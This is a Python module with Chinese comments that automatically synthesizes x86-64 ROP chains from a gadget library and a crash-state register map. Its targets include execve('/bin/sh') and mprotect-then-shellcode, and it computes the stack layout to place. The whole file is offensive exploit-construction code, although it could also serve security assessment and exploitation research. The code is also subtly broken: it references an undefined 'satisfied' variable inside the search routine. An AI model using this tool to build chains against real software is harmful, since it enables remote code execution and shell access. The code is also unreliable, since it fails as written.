# 约束感知的ROP链自动合成器 — 从gadget库和控制状态合成最小利用链
#
# 核心问题:
#   rop_analyzer.py 扫描gadget并分类 (pop/mov/syscall等), 但不会合成链。
#   现有方案 crackers 用p-code+SMT做形式化合成,
#   但需要完整的二进制分析和Z3求解器——对快速安全评估太重。
#
#   本模块填补 rop_analyzer→exploit 之间的空白:
#   给定gadget库 + 攻击者在崩溃点的寄存器控制状态 → 自动合成ROP链。
#
# 本模块的方法 — 约束引导的后向搜索:
#   1. 定义利用目标 (execve / mprotect+shellcode / write_primitive)
#   2. 将目标分解为寄存器需求: execve需要 rdi→"/bin/sh", rsi→0, rdx→0, rax→59
#   3. 从目标状态后向搜索: 对每个需要设置的寄存器, 找"设置该寄存器"的gadget
#   4. 约束传播: 某gadget需要寄存器X有特定值 → 这成为新的子目标
#   5. 贪心选择副作用最小的gadget (避免破坏已设置的寄存器)
#   6. 栈布局计算: 输出在栈上需放置的值序列
#
# 与 subreg_taint.py 的接合:
#   攻击者在崩溃点的寄存器控制状态来自 subreg_taint:
# 若rip受控→可直接跳转到gadget
# 若rdi受控→可跳过设置rdi的gadget, 缩短链长
# 若rsp受控→可直接做栈迁移
#
# 文献:
#   crackers — p-code+SMT链合成;
#     本项目取其约束建模思想但以贪心搜索替代SMT, 降低计算开销
#   ROPBlock — 链化gadget分组降低复杂度从O(2^n)到O(n);
#     本项目取其链化思想但以寄存器保存约束替代分组

from __future__ import annotations

import hashlib
import struct
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple


class ExploitGoal(str, Enum):
    """利用目标——ROP链的终点状态"""
    EXECVE_SH = "execve_sh"            # execve("/bin/sh", NULL, NULL)
    MPROTECT_SHELLCODE = "mprotect_sc" # mprotect + jump to shellcode
    WRITE_PRIMITIVE = "write_primitive" # 构造write-what-where
    CALL_FUNC = "call_func"            # 调用指定函数 (如system)


@dataclass
class GadgetSpec:
    """单个gadget的规格——精简自 rop_analyzer.Gadget"""
    addr: int = 0
    disasm: str = ""
    # 对寄存器的效果: reg → 新值的来源
    reg_writes: Dict[str, str] = field(default_factory=dict)
    # 来源类型: "pop" | "mov_reg" | "xor_self" | "const"
    reg_reads: Set[str] = field(default_factory=set)
    # 栈偏移: 执行后rsp的变化 (正=弹栈, 负=压栈)
    stack_delta: int = 0
    # 副作用: 会被此gadget破坏的寄存器
    clobbers: Set[str] = field(default_factory=set)
    # 终止方式
    ends_with: str = "ret"             # ret | call_reg | jmp_reg | syscall
    # 字节是否含坏字符
    has_bad_bytes: bool = False
    # 用于去重排序
    utility_score: float = 0.0


@dataclass
class TaintState:
    """崩溃点的寄存器控制状态——来自 subreg_taint"""
    rip_controlled: bool = False
    rsp_controlled: bool = False
    controlled_regs: Dict[str, int] = field(default_factory=dict)
    controlled_reg_values: Dict[str, int] = field(default_factory=dict)


@dataclass
class ChainStep:
    """ROP链中的一步"""
    gadget: GadgetSpec
    stack_value: int = 0              # 栈上放置的值 (仅pop类gadget)
    sets_registers: Dict[str, int] = field(default_factory=dict)
    rationale: str = ""


@dataclass
class ROPChainResult:
    """合成的ROP链"""
    goal: ExploitGoal
    steps: List[ChainStep] = field(default_factory=list)
    chain_length: int = 0
    stack_layout: List[int] = field(default_factory=list)
    constraints_satisfied: bool = False
    estimated_stack_bytes: int = 0
    bad_bytes_present: bool = False
    summary: str = ""


class ROPChainSynthesizer:
    """约束感知的ROP链合成器。

    典型用法:
        synth = ROPChainSynthesizer()
        synth.load_gadgets(gadgets)  # List[GadgetSpec]
        synth.set_taint(taint)       # TaintState from subreg_taint
        synth.set_bad_bytes({0x00, 0x0a})  # null and newline forbidden
        result = synth.synthesize(ExploitGoal.EXECVE_SH)
    """

    # 每个利用目标需要的寄存器状态 (x86-64 Linux)
    _GOAL_REGISTERS: Dict[ExploitGoal, Dict[str, int]] = {
        ExploitGoal.EXECVE_SH: {
            'rax': 59, 'rdi': 0, 'rsi': 0, 'rdx': 0,
            # rdi 应指向 "/bin/sh" 字符串 (需在二进制或栈上找到)
        },
        ExploitGoal.MPROTECT_SHELLCODE: {
            'rax': 10,  # mprotect syscall number
            # rdi = shellcode地址, rsi = 长度, rdx = PROT_RWX(7)
        },
        ExploitGoal.CALL_FUNC: {
            # rdi = 函数参数 (需调用者指定)
        },
    }

    # 用于设置寄存器的 gadget 类型优先级
    _GADGET_PREFERENCE = [
        'pop',          # 最干净: 弹栈→寄存器, 不破坏其他状态
        'xor_self',     # 清零: xor reg, reg
        'mov_reg',      # 寄存器拷贝: 需源寄存器可用
        'const',        # 常量赋值: 仅特定值可用
    ]

    def __init__(self):
        self._gadgets: List[GadgetSpec] = []
        self._taint = TaintState()
        self._bad_bytes: Set[int] = set()
        # 索引: reg_name → gadgets that write this reg
        self._reg_writers: Dict[str, List[GadgetSpec]] = defaultdict(list)
        # 二进制中可用的字符串地址 (如 "/bin/sh")
        self._string_addrs: Dict[str, int] = {}

    def load_gadgets(self, gadgets: List[GadgetSpec]) -> None:
        """加载gadget库并建立寄存器索引"""
        self._gadgets = gadgets
        self._reg_writers.clear()
        for g in gadgets:
            for reg in g.reg_writes:
                self._reg_writers[reg].append(g)
            # 计算效用分: 写的寄存器多+副作用少=高分
            g.utility_score = (
                len(g.reg_writes) * 2.0
                - len(g.clobbers) * 1.5
                + (3.0 if g.ends_with == 'ret' else 1.0)
            )

    def set_taint(self, taint: TaintState) -> None:
        self._taint = taint

    def set_bad_bytes(self, bad: Set[int]) -> None:
        self._bad_bytes = bad
        for g in self._gadgets:
            addr_bytes = struct.pack('<Q', g.addr)[:6]
            g.has_bad_bytes = any(b in self._bad_bytes for b in addr_bytes)

    def add_string(self, name: str, addr: int) -> None:
        """注册二进制中已知字符串的地址 (如 "/bin/sh")"""
        self._string_addrs[name] = addr

    def synthesize(self, goal: ExploitGoal,
                    extra_regs: Optional[Dict[str, int]] = None,
                    ) -> ROPChainResult:
        """主入口: 合成达到目标的ROP链"""
        target_regs = dict(self._GOAL_REGISTERS.get(goal, {}))
        if extra_regs:
            target_regs.update(extra_regs)

        # 特殊处理: execve的rdi需指向"/bin/sh"
        if goal == ExploitGoal.EXECVE_SH:
            binsh = self._find_string_addr('/bin/sh')
            if binsh is not None:
                target_regs['rdi'] = binsh
            else:
                return ROPChainResult(
                    goal=goal, constraints_satisfied=False,
                    summary="需提供'/bin/sh'字符串地址 (使用add_string)")

        # 移除攻击者已控制的寄存器 (不需要再设置)
        for reg in list(target_regs.keys()):
            if reg in self._taint.controlled_regs:
                if target_regs[reg] == self._taint.controlled_reg_values.get(reg):
                    del target_regs[reg]

        if not target_regs:
            return ROPChainResult(
                goal=goal, constraints_satisfied=True,
                summary="所有目标寄存器已被攻击者控制, 无需ROP链")

        # 后向贪心搜索
        steps, stack, satisfied = self._backward_search(target_regs)

        chain_len = len(steps)
        est_stack = sum(abs(s.gadget.stack_delta) for s in steps) + 8 * len(steps)

        return ROPChainResult(
            goal=goal,
            steps=steps,
            chain_length=chain_len,
            stack_layout=stack,
            constraints_satisfied=satisfied,
            estimated_stack_bytes=est_stack,
            bad_bytes_present=any(s.gadget.has_bad_bytes for s in steps),
            summary=self._build_result_summary(goal, steps, satisfied),
        )

    def _backward_search(self,
                          target_regs: Dict[str, int],
                          ) -> Tuple[List[ChainStep], List[int], bool]:
        """贪心后向搜索: 对每个需要设置的寄存器找最佳gadget"""
        steps: List[ChainStep] = []
        stack: List[int] = []
        # 追踪已被后续步骤设置的寄存器 (不可被前面的步骤破坏)
        already_set: Set[str] = set()
        clobbered: Set[str] = set()

        remaining = dict(target_regs)

        while remaining and len(steps) < 12:
            best_step: Optional[ChainStep] = None
            best_score = -float('inf')

            for reg, target_val in list(remaining.items()):
                candidates = self._reg_writers.get(reg, [])
                for g in candidates:
                    if g.has_bad_bytes:
                        continue
                    if any(c in already_set for c in g.clobbers):
                        continue  # 会破坏已设置的关键寄存器

                    # 该gadget设置reg的方式
                    write_type = g.reg_writes.get(reg, '')
                    if write_type == 'pop':
                        step = ChainStep(
                            gadget=g, stack_value=target_val,
                            sets_registers={reg: target_val},
                            rationale=f"pop {reg} ← {target_val:#x}")
                        score = g.utility_score + 10.0  # pop最高优先级
                    elif write_type == 'xor_self' and target_val == 0:
                        step = ChainStep(
                            gadget=g, stack_value=0,
                            sets_registers={reg: 0},
                            rationale=f"xor {reg},{reg} → 0")
                        score = g.utility_score + 8.0
                    elif write_type.startswith('mov_'):
                        src_reg = write_type[4:]
                        if src_reg not in clobbered:
                            step = ChainStep(
                                gadget=g, stack_value=0,
                                sets_registers={reg: target_val},
                                rationale=f"mov {reg}, {src_reg}")
                            score = g.utility_score + 5.0
                            # 需要确保src_reg有正确的值→成为新子目标
                            if src_reg not in remaining and src_reg not in already_set:
                                remaining[src_reg] = target_val
                    else:
                        continue

                    if score > best_score:
                        best_score = score
                        best_step = step

            if best_step is None:
                break

            steps.append(best_step)
            for reg in best_step.sets_registers:
                already_set.add(reg)
                remaining.pop(reg, None)
            for reg in best_step.gadget.clobbers:
                clobbered.add(reg)

            # 添加到栈布局
            if best_step.stack_value != 0 or best_step.gadget.stack_delta > 0:
                stack.append(best_step.stack_value)

        # 反转: 后向搜索产出的步是反向的, 执行时需要逆序
        steps.reverse()
        stack.reverse()

        # 检查是否需要终端gadget (syscall/间接跳转)
        # 终端gadget不写寄存器, 不在reg_writers中, 需单独处理
        if satisfied and steps:
            terminal = self._find_terminal_gadget(steps[0].gadget)
            if terminal and terminal not in [s.gadget for s in steps]:
                steps.append(ChainStep(
                    gadget=terminal, stack_value=0,
                    sets_registers={},
                    rationale=f"终端: {terminal.ends_with}"))

        return steps, stack, len(remaining) == 0

    def _find_terminal_gadget(self, last_gadget: GadgetSpec
                               ) -> Optional[GadgetSpec]:
        """查找终端gadget——执行流在此结束, 破坏寄存器无关紧要"""
        for g in self._gadgets:
            if g.ends_with in ('syscall', 'call_reg', 'jmp_reg'):
                return g
        return None

    def _find_string_addr(self, name: str) -> Optional[int]:
        return self._string_addrs.get(name)

    @staticmethod
    def _build_result_summary(goal: ExploitGoal,
                               steps: List[ChainStep],
                               satisfied: bool) -> str:
        status = "成功" if satisfied else "部分 (某些寄存器无可用gadget)"
        lines = [f"ROP链合成: {goal.value} [{status}]", f"链长: {len(steps)}"]
        for i, s in enumerate(steps):
            lines.append(f"  [{i}] {s.gadget.addr:#x}: {s.rationale}")
        return "\n".join(lines)


def gadget_from_dict(d: Dict[str, Any]) -> GadgetSpec:
    """从字典构建GadgetSpec——方便与rop_analyzer的Gadget转换"""
    return GadgetSpec(
        addr=d.get('address', d.get('addr', 0)),
        disasm=d.get('disasm', ''),
        reg_writes=d.get('reg_writes', {}),
        reg_reads=d.get('reg_reads', set()),
        stack_delta=d.get('stack_shift', d.get('stack_delta', 0)),
        clobbers=d.get('side_effects', set()),
        ends_with=d.get('ret_type', 'ret'),
    )


def quick_synth(gadgets: List[GadgetSpec],
                 controlled_regs: Dict[str, int],
                 goal: ExploitGoal = ExploitGoal.EXECVE_SH,
                 binsh_addr: int = 0,
                 bad_bytes: Optional[Set[int]] = None,
                 ) -> ROPChainResult:
    """便捷入口: 快速合成ROP链"""
    synth = ROPChainSynthesizer()
    synth.load_gadgets(gadgets)
    taint = TaintState(controlled_regs=controlled_regs)
    synth.set_taint(taint)
    if bad_bytes:
        synth.set_bad_bytes(bad_bytes)
    if binsh_addr:
        synth.add_string('/bin/sh', binsh_addr)
    return synth.synthesize(goal)
